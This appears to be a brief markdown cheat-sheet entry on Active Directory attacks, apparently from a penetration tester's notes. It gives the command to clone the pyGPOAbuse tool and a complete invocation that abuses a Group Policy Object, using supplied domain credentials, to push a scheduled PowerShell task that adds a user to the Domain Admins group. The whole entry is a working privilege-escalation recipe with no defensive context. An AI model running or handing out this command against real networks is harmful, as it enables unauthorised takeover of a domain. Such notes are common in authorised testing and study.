# AD attacks

## PyGPOAbuse
```
git clone https://github.com/Hackndo/pyGPOAbuse
```

```
python3 pygpoabuse.py 'domain.com/user:password' \
-gpo-id 'SID' \
-taskname 'webdev_disable' \
-dc-ip $target \
-powershell 'net group "Domain Admins" User /add'
```
